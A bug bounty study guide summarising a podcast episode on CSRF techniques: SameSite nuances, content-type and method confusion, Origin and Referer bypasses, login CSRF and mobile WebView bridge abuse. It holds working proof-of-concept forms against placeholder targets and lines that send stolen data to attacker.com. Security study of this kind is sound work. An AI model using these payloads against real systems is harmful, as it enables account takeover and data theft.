# Episode 28 — Surfin' with CSRFs — Full Technical Breakdown

## HOSTS
- **Justin Gardner** (@rhynorater) — Full-time bug bounty hunter, specializes in client-side web vulnerabilities
- **Joel Margolis** (teknogeek) — Security researcher, works on an offensive security team, experienced in mobile and web application security

---

## PART 1 — SameSite Cookies: The Modern CSRF Gatekeeper

### Technique 1 — Understanding SameSite Lax Default Behavior

- **What it is:** Since February 4, 2020, Chromium browsers implicitly set all cookies without an explicit `SameSite` attribute to `SameSite=Lax`. This means cookies are only sent on cross-site requests if the request is a **top-level navigation** (the URL bar changes) AND the method is **GET**.
- **Why it works (for defense):** Attackers can no longer trigger arbitrary POST requests from `attacker.com` and have the victim's cookies attached. The browser strips cookies from cross-site sub-resource requests (fetch, XHR, iframes, images).
- **Critical nuance:** `SameSite=Lax` set **implicitly** (no attribute present) is NOT identical to `SameSite=Lax` set **explicitly**. Implicit Lax includes the "Lax+POST" two-minute window. Explicit Lax does NOT.

**How to check cookie attributes:**
```javascript
// In browser DevTools console:
document.cookie; // shows accessible cookies

// Better: check in DevTools > Application > Cookies
// Look at the SameSite column for each cookie
// "Lax" (explicit) vs blank/empty (implicit Lax) vs "None" vs "Strict"
```

**What each SameSite value means for CSRF:**
```
SameSite=None   -> Cookies sent on ALL cross-site requests (CSRF fully possible)
                   Requires Secure flag. Exploitable with standard CSRF forms.

SameSite=Lax    -> Cookies sent ONLY on top-level GET navigations cross-site
(explicit)         No Lax+POST window. POST CSRF is dead.

SameSite=Lax    -> Same as explicit Lax, BUT with 2-minute POST window
(implicit/default)  after cookie is set. POST CSRF possible within that window.

SameSite=Strict -> Cookies NEVER sent on any cross-site request.
                   Even top-level GET navigations are blocked.
                   CSRF is effectively impossible.
```

**Where to apply:** Every target. First step of CSRF assessment is checking cookie SameSite attributes.

**Limitations:** Only enforced by Chromium-based browsers and Firefox. Older browsers or non-standard clients may ignore SameSite entirely.

---

### Technique 2 — Lax+POST: The Two-Minute Cookie Window

- **What it is:** When a cookie is set **without an explicit SameSite attribute** (i.e., the browser defaults it to Lax), there is a **two-minute grace period** during which the browser will also send that cookie on **cross-site top-level POST requests**. After two minutes, it reverts to standard Lax behavior (GET only).
- **Why it works:** This accommodation was created for slow-loading Single Sign-On (SSO) flows that rely on cross-site POST redirects during authentication. The timer resets every time the cookie is re-set (e.g., on re-login).
- **Attack flow:**

```
ATTACKER PAGE (evil.com)
        |
        | Step 1: window.open() to target.com/login
        |         (forces re-login / session cookie refresh)
        |         Cookie timer RESETS to 0 → 2-minute window starts
        |
        | Step 2: Within 2 minutes, submit a cross-site
        |         top-level POST form to target.com/api/dangerous-action
        |         Cookies ARE sent because we're within the Lax+POST window
        |
        v
   CSRF ACHIEVED ON POST ENDPOINT
```

**Code example — Exploiting Lax+POST:**
```html
<!DOCTYPE html>
<html>
<head><title>Lax+POST CSRF Exploit</title></head>
<body>
<script>
  // Step 1: Force a re-login to refresh the session cookie
  // This resets the 2-minute Lax+POST timer
  var loginWindow = window.open('https://target.com/auth/login?auto=true');

  // Step 2: After a short delay (ensure login completes), submit the CSRF form
  setTimeout(function() {
    loginWindow.close();
    document.getElementById('csrf-form').submit();
  }, 3000); // 3 seconds — enough for login redirect, well within 2-min window
</script>

<!-- The actual CSRF POST form -->
<form id="csrf-form" method="POST" action="https://target.com/api/delete-account">
  <input type="hidden" name="confirm" value="true" />
</form>
</body>
</html>
```

- **Where to apply:** Any target that (a) uses cookies without explicit `SameSite` attribute, (b) has a re-login / SSO gadget that refreshes the session cookie, and (c) has a state-changing POST endpoint without CSRF tokens.
- **Limitations:** Requires finding a "session refresh gadget" — an endpoint that re-sets the session cookie via a GET-triggerable flow. The 2-minute window is tight but workable. Does NOT work if `SameSite=Lax` is set explicitly.

---

### Technique 3 — Finding Session Refresh Gadgets

- **What it is:** A "gadget" is a piece of existing application functionality that, by itself, is not a vulnerability, but becomes a critical link in an exploit chain. For Lax+POST CSRF, the key gadget is any endpoint that **re-sets the session cookie** — resetting the two-minute Lax+POST timer.
- **Why it works:** Most SSO or OAuth login flows will re-set the session cookie even if the user already has an active session. This resets the Lax+POST window, enabling POST-based CSRF.
- **Where to look for session refresh gadgets:**

```
Login endpoints:          /login, /auth/login, /signin, /sso/callback
OAuth flows:              /oauth/authorize, /oauth/callback, /auth/google
Session refresh:          /api/refresh-token, /auth/refresh, /session/renew
Auto-login redirects:     /auth/auto, /login?continue=...
Password-less login:      /magic-link/verify, /auth/token/...
```

**How to test:**
```bash
# 1. Note the Set-Cookie timestamp on your current session
# 2. Hit the login/SSO endpoint as a GET request
curl -v 'https://target.com/auth/login' -b 'session=YOUR_SESSION_COOKIE' 2>&1 | grep -i 'set-cookie'

# If you see a new Set-Cookie header with the session cookie, you have a gadget
# The Lax+POST 2-minute window has been reset
```

- **Where to apply:** Any target where you need POST-based CSRF and SameSite is implicit Lax. This is the missing link in most modern CSRF chains.
- **Limitations:** Some applications will not re-issue cookies if a valid session already exists. Some SSO flows require user interaction (e.g., clicking "Continue").

---

### Technique 4 — SameSite Strict Bypass Awareness

- **What it is:** `SameSite=Strict` cookies are NEVER sent on cross-site requests — not even top-level GET navigations. This is the strongest cookie protection and effectively kills CSRF.
- **Why it matters:** It is rare in the wild, but some high-security applications use it. If you encounter `SameSite=Strict`, standard CSRF techniques (including Lax+POST) will fail.
- **Anecdote from the episode:** Justin and a colleague found what appeared to be a CSRF vulnerability (no CSRF tokens, no origin checks). They tested it by manually triggering the action to confirm the endpoint was unprotected. They then tried the cross-site exploit — and it failed because the cookies were `SameSite=Strict`. They had already deleted the colleague's account during the manual test.

**How to detect:**
```javascript
// DevTools > Application > Cookies > look for SameSite = "Strict"
// Or intercept in Burp/Caido and check the Set-Cookie header:
// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

- **Takeaway:** Always check `SameSite` values BEFORE building your CSRF PoC. Do not delete anyone's account to test.

---

## PART 2 — CSRF Exploitation Primitives

### Technique 5 — Content-Type Confusion (JSON to Form-Encoded)

- **What it is:** Modern applications typically send API requests with `Content-Type: application/json`, which cannot be sent by an HTML form element. However, if the server also accepts `text/plain`, `application/x-www-form-urlencoded`, or `multipart/form-data`, CSRF becomes possible because HTML forms CAN produce these content types.
- **Why it works:** Many backend frameworks and API gateways are lenient about content type parsing. They may parse the body regardless of the declared content type, or fall back to JSON parsing for any body that looks like JSON.

**Attack flow:**
```
Normal request (not CSRF-able):
POST /api/change-email
Content-Type: application/json
{"email":"attacker@evil.com"}

Modified request (potentially CSRF-able):
POST /api/change-email
Content-Type: text/plain
{"email":"attacker@evil.com"}

Or:
POST /api/change-email
Content-Type: application/x-www-form-urlencoded
email=attacker@evil.com
```

**Code example — JSON body via text/plain form:**
```html
<!-- Sends a POST with Content-Type: text/plain -->
<!-- The body will be: {"email":"attacker@evil.com","dummy":"= -->
<form method="POST" action="https://target.com/api/change-email" enctype="text/plain">
  <input type="hidden" name='{"email":"attacker@evil.com","dummy":"' value='"}' />
  <input type="submit" value="Submit" />
</form>
```

**Code example — Standard form-encoded CSRF:**
```html
<form method="POST" action="https://target.com/api/change-email"
      enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="submit" value="Submit" />
</form>

<script>
  document.forms[0].submit(); // auto-submit
</script>
```

**Testing methodology (per Joel's insight):** Content type handling is usually implemented at the server/middleware level, not per-endpoint. Test 1-2 endpoints. If the server rejects non-JSON content types on one endpoint, it likely rejects them on all endpoints for that service.

```bash
# Test with Burp/Caido: change Content-Type header on any POST endpoint
# Original:  Content-Type: application/json
# Test 1:    Content-Type: text/plain
# Test 2:    Content-Type: application/x-www-form-urlencoded
# Test 3:    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
# Test 4:    Remove Content-Type header entirely

# If any of these return a successful response, the endpoint is CSRF-able
```

- **Where to apply:** Any JSON API that performs state-changing actions. Particularly common on older or simpler backends (Express.js with body-parser, Flask, Django, PHP).
- **Limitations:** If the server strictly validates `Content-Type: application/json` and rejects all others, this technique fails. Also subject to SameSite restrictions.

---

### Technique 6 — POST-to-GET Method Conversion

- **What it is:** Convert a POST request to a GET request. If the server accepts both methods for the same endpoint, you can exploit CSRF with a simple link click (top-level GET navigation), which easily bypasses `SameSite=Lax`.
- **Why it works:** Many frameworks route both GET and POST to the same handler, or the server parses query parameters and body parameters interchangeably.

**Code example — GET-based CSRF via image tag or link:**
```html
<!-- Simple GET CSRF via link -->
<a href="https://target.com/api/change-email?email=attacker@evil.com">
  Click here for free stuff
</a>

<!-- Auto-triggered GET CSRF via image (no top-level navigation though) -->
<!-- NOTE: This won't send SameSite=Lax cookies because it's not top-level -->
<img src="https://target.com/api/change-email?email=attacker@evil.com" />

<!-- Auto-triggered GET CSRF via top-level redirect (sends Lax cookies) -->
<script>
  window.location = 'https://target.com/api/change-email?email=attacker@evil.com';
</script>
```

**How to test in Burp/Caido:**
```
Both Burp Suite and Caido have a "Change Request Method" feature.
- Burp: Right-click request > Change request method
- Caido: Similar right-click option (Justin specifically lobbied for this feature)

1. Capture a POST request in your proxy
2. Convert to GET (moves body params to query string)
3. Send and check if the response is identical/successful
4. If yes → you have a GET-based CSRF that bypasses SameSite=Lax
```

- **Where to apply:** Every POST endpoint that performs a state change. This is one of the fastest CSRF checks you can do.
- **Limitations:** Many modern frameworks distinguish GET and POST at the routing level. But legacy applications and certain frameworks (PHP, some Node.js setups) are permissive.

---

### Technique 7 — HEAD Request Method Confusion (Rails-Specific)

- **What it is:** In Ruby on Rails, the router automatically routes `HEAD` requests to the same handler as `GET` requests. If the handler uses an `if request.get? ... else ...` pattern, a `HEAD` request falls into the `else` branch — which may contain POST-like behavior such as granting OAuth permissions.
- **Why it works:** Rails implicitly routes HEAD to GET handlers for convenience. But internally, `request.get?` returns `false` for HEAD requests, so any `if/else` branching on method type will treat HEAD the same as POST.

**Vulnerable Rails code pattern:**
```ruby
# config/routes.rb
match '/oauth/authorize', to: 'oauth#authorize', via: [:get, :post]

# app/controllers/oauth_controller.rb
def authorize
  if request.get?
    # Show the authorization prompt to the user
    render :authorize_form
  else
    # Grant the authorization (intended for POST only)
    grant_authorization!  # <-- HEAD requests end up here!
  end
end
```

**Attack flow:**
```
                    Rails Router
                        |
    HEAD /oauth/authorize
                        |
        Routes to same handler as GET
        (Rails implicit behavior)
                        |
        request.get? → false (it's HEAD, not GET)
                        |
        Falls into else branch
                        |
        grant_authorization! executes
                        |
            OAUTH BYPASS ACHIEVED
```

**Real-world impact:** Teddy Katz used this exact technique to bypass GitHub's OAuth flow, earning a $25,000 bounty. Blog post: "Bypassing GitHub's OAuth flow."

**How to test:**
```bash
# Send a HEAD request to endpoints that handle both GET and POST
curl -I -X HEAD 'https://target.com/oauth/authorize?client_id=ATTACKER_APP&scope=repo' \
  -b 'session=VICTIM_SESSION'

# Check if the action was performed (e.g., OAuth grant issued)
# Also test: OPTIONS method (may also fall into the else branch)
```

- **Where to apply:** Any Ruby on Rails application, especially OAuth authorization endpoints and any route defined with `via: [:get, :post]`.
- **Limitations:** This was discovered in 2019, before SameSite Lax default (2020). Sending a HEAD request cross-site with cookies is now subject to SameSite rules. A HEAD request is not a standard form submission, so triggering it from an attacker page with cookies requires `SameSite=None` or same-site context. However, the method confusion itself remains a valid server-side logic bug.

---

### Technique 8 — Rails `_method` Parameter Override

- **What it is:** Ruby on Rails supports a `_method` query/body parameter that overrides the HTTP method at the framework level. A GET request with `?_method=POST` will be interpreted by Rails as a POST request.
- **Why it works:** Rails implemented this as a workaround because HTML forms only support GET and POST methods. The `_method` parameter allows forms to simulate PUT, PATCH, and DELETE. But it also means a GET request can be treated as POST server-side.

**Code example:**
```html
<!-- Send a GET request that Rails interprets as POST -->
<!-- This is a top-level navigation that sends SameSite=Lax cookies -->
<a href="https://target.com/api/transfer?_method=POST&to=attacker&amount=10000">
  Click me
</a>

<!-- Or auto-redirect -->
<script>
  window.location = 'https://target.com/api/transfer?_method=POST&to=attacker&amount=10000';
</script>
```

**Where to apply:** Ruby on Rails applications specifically. Also check for similar behavior in other frameworks:
```
Rails:          _method parameter
Laravel (PHP):  _method parameter
Some Java:      _method parameter
.NET:           X-HTTP-Method-Override header (not form-exploitable)
```

- **Limitations:** The browser still sends an actual GET request, so web servers and reverse proxies see GET. The override only works at the application framework level. Whether this actually bypasses SameSite depends on whether the browser uses the real HTTP method (GET) or the overridden one for SameSite evaluation — and it uses the real one (GET), which means SameSite=Lax cookies WILL be sent on top-level navigation. This makes `_method` overrides particularly interesting for CSRF.

---

## PART 3 — Bypassing CSRF Defenses

### Technique 9 — Origin Header: Null Origin via Data URI iframe

- **What it is:** Some applications validate CSRF by checking the `Origin` header. If the check is simply "does Origin match our domain OR is it null?", an attacker can exploit the null case. Even if the check is "Origin must match our domain" without handling null, some implementations skip validation when Origin is absent/null.
- **Why it works:** An `<iframe>` with a `src` set to a `data:` URI has a **null origin**. JavaScript executing within that iframe sends requests with `Origin: null`.

**Code example:**
```html
<!-- Attacker page: evil.com/exploit.html -->
<!-- The iframe's data: URI context has a null origin -->
<iframe src="data:text/html,
  <form method='POST' action='https://target.com/api/change-email'>
    <input name='email' value='attacker@evil.com'>
  </form>
  <script>document.forms[0].submit();</script>
">
</iframe>
```

**Alternative — sandboxed iframe:**
```html
<!-- sandbox attribute without allow-same-origin also produces null origin -->
<iframe sandbox="allow-scripts allow-forms"
  src="https://attacker.com/csrf-payload.html">
</iframe>

<!-- csrf-payload.html contains: -->
<!-- <form method="POST" action="https://target.com/api/...">...</form> -->
<!-- <script>document.forms[0].submit();</script> -->
```

**Server-side vulnerable check:**
```python
# Vulnerable: allows null origin
origin = request.headers.get('Origin')
if origin is None or origin == 'https://target.com':
    process_request()  # Attacker sends Origin: null → bypassed

# Also vulnerable: missing origin = no check
if origin and origin != 'https://target.com':
    return 403  # Attacker sends Origin: null → origin is None → check skipped
```

- **Where to apply:** Any application that uses Origin header as a CSRF defense. Test by sending a request with `Origin: null` in Burp/Caido.
- **Limitations:** SameSite=Lax may block cookies on cross-site requests from data URI iframes (they are not top-level navigations). CSP may block data: URIs for frames. Modern browsers are increasingly restrictive with data: URI iframes. This technique is more reliable when `SameSite=None` is set on cookies.

---

### Technique 10 — Referrer Header Bypass via Referrer-Policy Meta Tag

- **What it is:** Some applications validate the `Referer` header as a CSRF defense, checking that the referring URL contains the expected domain. Modern browsers default to sending only the origin (scheme + host) in the `Referer` header for cross-origin requests (the `strict-origin-when-cross-origin` policy). However, the **attacker controls the referrer policy on their own page** and can force the browser to send the **full URL** as the referrer.
- **Why it works:** If the server checks `if "target.com/" in referer_header`, an attacker can create a path on their server like `/target.com/` so the full referrer URL contains the expected string. The browser's default policy would only send the origin (`https://attacker.com`), but the attacker overrides this with `unsafe-url` to send the full path.

**Attack flow:**
```
Server-side check (vulnerable):
    referer = request.headers['Referer']
    if 'target.com/' not in referer:
        return 403  # CSRF blocked

Default browser behavior:
    Referer: https://attacker.com  (origin only, no path)
    → "target.com/" NOT in "https://attacker.com"
    → BLOCKED (accidentally safe)

Attacker bypass:
    1. Host exploit at: https://attacker.com/target.com/exploit.html
    2. Set referrer policy to "unsafe-url" on that page
    3. Browser sends: Referer: https://attacker.com/target.com/exploit.html
    4. "target.com/" IS in the full referrer
    → CSRF BYPASSED
```

**Code example:**
```html
<!-- Host this at: https://attacker.com/target.com/exploit.html -->
<!DOCTYPE html>
<html>
<head>
  <!-- Force the browser to send the FULL URL as the Referer header -->
  <meta name="referrer" content="unsafe-url">
</head>
<body>
  <form id="csrf" method="POST" action="https://target.com/api/change-password">
    <input type="hidden" name="new_password" value="attacker123" />
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**Alternative — via HTTP header (if you control the server):**
```
HTTP/1.1 200 OK
Referrer-Policy: unsafe-url
Content-Type: text/html

<form method="POST" action="https://target.com/api/...">
  ...
</form>
```

**All Referrer-Policy values (useful reference):**
```
no-referrer              → No Referer header sent at all
no-referrer-when-downgrade → Full URL for same protocol, nothing for downgrades
origin                   → Only the origin (https://attacker.com)
origin-when-cross-origin → Full URL same-origin, origin only cross-origin
same-origin              → Full URL same-origin, nothing cross-origin
strict-origin            → Origin only for same protocol, nothing for downgrades
strict-origin-when-cross-origin → DEFAULT. Origin cross-origin, full same-origin
unsafe-url               → FULL URL always, even cross-origin ← ATTACKER USES THIS
```

- **Where to apply:** Any application that uses the `Referer` header as a CSRF defense with a substring/contains check rather than a strict origin comparison.
- **Limitations:** If the server checks `Referer` with a strict origin comparison (just the scheme+host, not path), this bypass fails. Also still subject to SameSite cookie restrictions.

---

### Technique 11 — Suppressing the Referer Header Entirely

- **What it is:** If the server only blocks requests where the `Referer` is present AND doesn't match, but allows requests with NO `Referer` header, you can suppress it entirely.
- **Why it works:** Some server implementations check `if referer is present AND referer doesn't match → block`. If the referer is absent, the check is skipped.

**Code example:**
```html
<head>
  <!-- Suppress the Referer header entirely -->
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form id="csrf" method="POST" action="https://target.com/api/dangerous-action">
    <input type="hidden" name="param" value="evil" />
  </form>
  <script>document.forms[0].submit();</script>
</body>
```

**Vulnerable server logic:**
```python
referer = request.headers.get('Referer')
if referer and 'target.com' not in referer:
    return 403  # Only blocks if referer is present and wrong
# If referer is None/missing → proceeds without check
process_request()
```

- **Where to apply:** Applications with Referer-based CSRF protection. Always test with no Referer first (easier), then try the path-injection bypass from Technique 10.

---

## PART 4 — Advanced Exploitation Chains

### Technique 12 — Double-Action Single-Click: Form Submit + onClick Harvesting

- **What it is:** A technique to trigger **two separate actions** from a single user click by combining a `<form>` submission with a button's `onclick` handler. The form submission navigates one request, while the `onclick` opens a second window/request.
- **Why it works:** When a `<button>` inside a `<form>` is clicked, both the `onclick` JavaScript handler AND the form's native `submit` behavior fire. These are two distinct execution paths from one user interaction.

**Code example:**
```html
<!DOCTYPE html>
<html>
<body>
  <!-- Form submission: Action 1 (e.g., login CSRF into legacy domain) -->
  <form id="csrf-form" method="POST" action="https://legacy.target.com/auto-login"
        target="_blank">
    <input type="hidden" name="token" value="ATTACKER_VALUE" />

    <!-- Button: onclick triggers Action 2 -->
    <button type="submit" onclick="triggerSecondAction()">
      Click to continue
    </button>
  </form>

  <script>
    function triggerSecondAction() {
      // Action 2: Open a delayed redirect that will fire the real CSRF
      // after Action 1 (login) has completed
      window.open('https://attacker.com/delay-and-csrf.php');
    }
  </script>
</body>
</html>
```

**Attack flow (from Justin's real bug):**
```
   USER CLICKS BUTTON
          |
          +--→ [Action 1: Form Submit]
          |      POST to legacy.target.com/auto-login
          |      → Logs victim into attacker-controlled session on legacy domain
          |      → target="_blank" opens in new tab
          |
          +--→ [Action 2: onclick handler]
                 window.open('https://attacker.com/delay-and-csrf.php')
                 → PHP script sleeps 2 seconds (waits for login to complete)
                 → Then issues a 307 redirect to the real CSRF target
                 → POST https://legacy.target.com/api/modify-account
                 → Victim's freshly-set cookies are sent
                 → CSRF ACHIEVED
```

- **Where to apply:** Complex CSRF chains that require multiple sequential requests (e.g., login CSRF followed by action CSRF). Also useful when you need to both refresh a session and exploit it within one user interaction.
- **Limitations:** May trigger popup blockers. The `window.open` in onclick is generally allowed (user-initiated), but some browsers may still block it.

---

### Technique 13 — 307 Redirect for POST Preservation

- **What it is:** When a server responds with HTTP status `307 Temporary Redirect`, the browser preserves the original HTTP method and body when following the redirect. Unlike `302` (which converts POST to GET), `307` keeps a POST as a POST.
- **Why it works:** This is defined HTTP behavior. The browser must resubmit the POST with the same body to the new Location. This is critical for CSRF chains where you need to redirect a victim through an intermediate server while preserving the POST method.

**Code example — Attacker's delay-and-redirect server (PHP):**
```php
<?php
// delay-and-csrf.php — hosted on attacker.com
// Step 1: Sleep to allow a prior action (e.g., login) to complete
sleep(2);

// Step 2: Issue a 307 redirect to the CSRF target
// The browser will re-send the POST with the same body
header('HTTP/1.1 307 Temporary Redirect');
header('Location: https://target.com/api/dangerous-action');
exit;
?>
```

**Code example — Full chain with form + 307:**
```html
<!-- Attacker page -->
<form method="POST" action="https://attacker.com/delay-and-csrf.php">
  <input type="hidden" name="param1" value="evil_value" />
  <input type="hidden" name="param2" value="evil_value2" />
  <button type="submit">Click me</button>
</form>

<!-- The form POSTs to attacker.com -->
<!-- attacker.com responds with 307 → target.com/api/dangerous-action -->
<!-- Browser re-sends the POST with param1=evil_value&param2=evil_value2 to target.com -->
<!-- Victim's cookies for target.com are attached (subject to SameSite rules) -->
```

- **Where to apply:** Any CSRF chain that requires timing control or method preservation through redirects. Pairs well with Technique 12 for multi-step attacks.
- **Limitations:** Subject to SameSite cookie rules. The redirect changes the origin, so the final request will have the target domain as the URL bar destination (top-level navigation).

---

### Technique 14 — Login CSRF: Forcing Authentication into Attacker's Session

- **What it is:** Instead of performing actions on the victim's account, force the victim to log into the **attacker's** account. The victim then performs actions (uploads sensitive data, enters payment info, etc.) that are captured in the attacker's account.
- **Why it works:** Login endpoints often lack CSRF protection because developers assume "why would an attacker want to log someone into their own account?" But this enables session fixation and data harvesting.

**Code example:**
```html
<!-- Login CSRF: Force victim to authenticate as the attacker -->
<form id="login-csrf" method="POST" action="https://target.com/api/login">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="password" value="attackerPassword123" />
</form>
<script>
  document.getElementById('login-csrf').submit();
</script>

<!-- After this, the victim is logged into the attacker's account -->
<!-- Any data they enter (credit cards, addresses, documents) goes to attacker's account -->
```

**Broader use:** In Justin's multi-step CSRF chain, the first action was a login CSRF into a legacy subdomain to establish a session, followed by a second CSRF to modify account data on that subdomain. The data changes then propagated back to the main application through internal data pipelines.

- **Where to apply:** Login endpoints, SSO callback endpoints, "link account" endpoints. Per the CLAUDE.md rules: **signIn/signOut redirect parameters are frequent XSS/open redirect targets** — and they're also frequent CSRF targets.

---

## PART 5 — HTML Form Constraints and Content-Type Tricks

### Technique 15 — The Three Allowed enctype Values

- **What it is:** HTML `<form>` elements can only produce three `Content-Type` values via the `enctype` attribute. These are the ONLY content types achievable through pure CSRF (without Flash or other plugins).
- **Why it matters:** Understanding these constraints is fundamental to CSRF exploitation.

```
enctype="application/x-www-form-urlencoded"   (default)
  → Body: key1=value1&key2=value2
  → Most common form encoding

enctype="multipart/form-data"
  → Body: multipart boundary-delimited sections
  → Used for file uploads
  → Can sometimes trick JSON parsers due to body structure flexibility

enctype="text/plain"
  → Body: key1=value1\r\nkey2=value2
  → The = sign between name and value is literal
  → Critical for smuggling JSON payloads (see Technique 5)
```

**JSON smuggling via text/plain:**
```html
<!--
  With text/plain, the body format is: name=value
  We abuse this to construct valid JSON:
  name portion:  {"email":"attacker@evil.com","x":"
  value portion: "}
  Result body:   {"email":"attacker@evil.com","x":"="}
  This is valid JSON that a lenient parser will accept
-->
<form method="POST" action="https://target.com/api/update"
      enctype="text/plain">
  <input type="hidden"
    name='{"email":"attacker@evil.com","x":"'
    value='"}' />
</form>
```

**Multipart body structure (useful for creative payloads):**
```html
<form method="POST" action="https://target.com/api/update"
      enctype="multipart/form-data">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<!--
  Produces:
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXX
  Body:
  ------WebKitFormBoundaryXXX
  Content-Disposition: form-data; name="email"

  attacker@evil.com
  ------WebKitFormBoundaryXXX--
-->
```

- **Where to apply:** Every CSRF attempt. Know which enctype to use based on how the server parses the body.

---

## PART 6 — Mobile CSRF / CARF (Cross-App Request Forgery)

### Technique 16 — QR Code to Internal WebView Hijack

- **What it is:** Mobile apps with built-in QR code scanners may open arbitrary URLs in an **internal WebView** when a non-standard (HTTP/HTTPS) URL is scanned. This internal WebView often has access to JavaScript bridges and internal URL schemes that are not available to external browsers.
- **Why it works:** The app's QR scanner is designed to handle internal deep links (e.g., `myapp://profile/123`). When it receives an `http://` URL, it opens it in an internal WebView rather than the system browser, granting the loaded page access to privileged JavaScript interfaces.

**Attack flow (from Joel's TikTok bug, 2019):**
```
  VICTIM scans QR code with TikTok's built-in scanner
        |
        v
  QR code contains: https://nottiktok.com/exploit.html
  (attacker-owned domain that passes the host check)
        |
        v
  TikTok opens URL in INTERNAL WebView
  (not the system browser)
        |
        v
  Internal WebView has JavaScript bridge access
        |
        v
  exploit.html calls bridge functions:
    - getUserInfo()     → leaks user data
    - installAPK(url)   → prompts APK installation
    - showPopup(html)   → displays attacker-controlled UI
        |
        v
  FULL ACCOUNT COMPROMISE
```

**The endsWith bypass:**
```java
// Vulnerable host validation in TikTok's JavaScript bridge
boolean isSafeHost(String host) {
    for (String allowed : ALLOWED_HOSTS) {
        if (host.equals(allowed) || host.endsWith(allowed)) {
            return true;  // VULNERABLE
        }
    }
    return false;
}

// ALLOWED_HOSTS includes "tiktok.com"
// Attacker registers "nottiktok.com"
// "nottiktok.com".endsWith("tiktok.com") → TRUE
// Bridge access granted to attacker's page
```

**Correct implementation:**
```java
// Safe: check with preceding dot
boolean isSafeHost(String host) {
    for (String allowed : ALLOWED_HOSTS) {
        if (host.equals(allowed) || host.endsWith("." + allowed)) {
            return true;  // Only matches actual subdomains
        }
    }
    return false;
}
// "nottiktok.com".endsWith(".tiktok.com") → FALSE
// "sub.tiktok.com".endsWith(".tiktok.com") → TRUE
```

- **Where to apply:** Any mobile app with a built-in QR scanner, deep link handler, or internal WebView. Check for JavaScript bridges, internal URL schemes, and host validation logic.
- **Limitations:** Requires the victim to scan a QR code within the target app. The `endsWith` bypass only works if the allowed domain list includes entries without a preceding dot.

---

### Technique 17 — Deep Link / Intent CSRF (CARF)

- **What it is:** Mobile apps register deep links (iOS Universal Links, Android App Links) and custom URL schemes. If a deep link triggers a state-changing action without user confirmation, any app or website can trigger that action by redirecting to the deep link.
- **Why it works:** Unlike web CSRF, there is no equivalent of "SameSite cookies" for deep links. The target app cannot determine whether the deep link was initiated by a legitimate source or by an attacker's website/app. The functionality either exists and is exploitable, or it doesn't exist.

**Code example — Web page triggering a deep link:**
```html
<!-- From a web page, trigger a deep link that adds a friend in the target app -->
<script>
  window.location = 'targetapp://add-friend?user_id=attacker123';
</script>

<!-- Or via iframe (may work on some platforms): -->
<iframe src="targetapp://add-friend?user_id=attacker123" style="display:none"></iframe>
```

**Android Intent URL scheme (older, may work on some browsers):**
```html
<!-- Android intent:// scheme can trigger app intents from the browser -->
<!-- Note: this is blocked in modern Chrome/Chromium but may work in older browsers -->
<a href="intent://add-friend?user_id=attacker123#Intent;scheme=targetapp;package=com.target.app;end">
  Click here
</a>
```

- **Where to apply:** Any mobile app that has deep links performing actions (add friend, follow user, share content, download file, make purchase). The bug class is especially impactful when the action has security consequences.
- **Limitations:** As Joel noted: "either the functionality is exposed or it isn't." There's no way to add a cross-app origin check to deep links. The only defense is user confirmation dialogs or removing the deep link entirely. Android intents from browser URLs are largely deprecated in modern Chrome.

---

### Technique 18 — JavaScript Bridge Exploitation from WebView

- **What it is:** When a mobile app opens a URL in an internal WebView, that WebView may expose JavaScript bridge objects that allow the loaded page to call native app functions. If the bridge's origin validation is weak, an attacker-controlled page can invoke these functions.
- **Why it works:** JavaScript bridges (Android's `addJavascriptInterface`, iOS's `WKScriptMessageHandler`) are designed for the app's own web content to communicate with native code. If an attacker can load their page in the WebView (via deep link, QR code, redirect, etc.), they can call the bridge.

**Typical bridge access pattern:**
```javascript
// Attacker's page loaded in the app's internal WebView
// The bridge is exposed as a global JS object

// Android bridge example:
if (window.AppBridge) {
  // Leak user information
  var userInfo = window.AppBridge.getUserInfo();
  // Send it to attacker's server
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(userInfo));

  // Trigger privileged actions
  window.AppBridge.followUser('attacker_id');
  window.AppBridge.sendMessage('victim_friend_id', 'check out this link...');
}

// iOS bridge example:
if (window.webkit && window.webkit.messageHandlers.appBridge) {
  window.webkit.messageHandlers.appBridge.postMessage({
    action: 'getUserInfo',
    callback: 'exfilCallback'
  });
}

function exfilCallback(data) {
  navigator.sendBeacon('https://attacker.com/steal', JSON.stringify(data));
}
```

- **Where to apply:** Any mobile app that uses internal WebViews with JavaScript bridges. Common in social media apps, e-commerce apps, and super-apps.

---

## PART 7 — The Gadget-Based Methodology

### Technique 19 — Building a Gadget Inventory

- **What it is:** A methodology where you systematically catalog small, individually non-vulnerable behaviors ("gadgets") discovered during testing, then combine them into exploit chains.
- **Why it works:** Modern applications are rarely vulnerable to single-step attacks. Bugs come from chaining multiple weaknesses. If you don't record gadgets, you'll forget them and miss chains.

**Types of CSRF-relevant gadgets:**
```
SESSION GADGETS:
  - Endpoint that refreshes/re-sets session cookies (for Lax+POST)
  - OAuth re-authorization endpoint accessible via GET
  - SSO callback that re-authenticates without user interaction
  - "Remember me" endpoint that issues new cookies

NAVIGATION GADGETS:
  - Open redirect on the target domain (for Referer bypass)
  - Page that reflects URL parameters into links
  - Endpoint that 307-redirects with method preservation

VALIDATION BYPASS GADGETS:
  - Endpoint that accepts multiple content types
  - Endpoint that doesn't check CSRF token (even if others do)
  - Endpoint that accepts GET for a POST action
  - Subdomain with weaker CSRF protections

DATA FLOW GADGETS:
  - Legacy subdomain whose data syncs to the main application
  - Internal API that trusts data from another internal service
  - Webhook endpoint that forwards requests
```

**Note-taking template:**
```markdown
## Gadget Log — target.com

### Session Refresh
- GET /auth/sso?continue=/dashboard → Re-sets session cookie
- Confirmed: Set-Cookie header present in response

### Content-Type Flexibility
- POST /api/v2/* accepts text/plain → Tested on /api/v2/settings
- POST /api/v1/* rejects non-JSON → Strict content-type checking

### Open Redirect
- /redirect?url= → Only checks if URL starts with / (relative only)
- /oauth/callback?next= → Allows full URLs, but validates domain... badly

### Missing CSRF Token
- POST /legacy/update-profile → No CSRF token in request
- Uses only Referer check (bypassable via Technique 10)
```

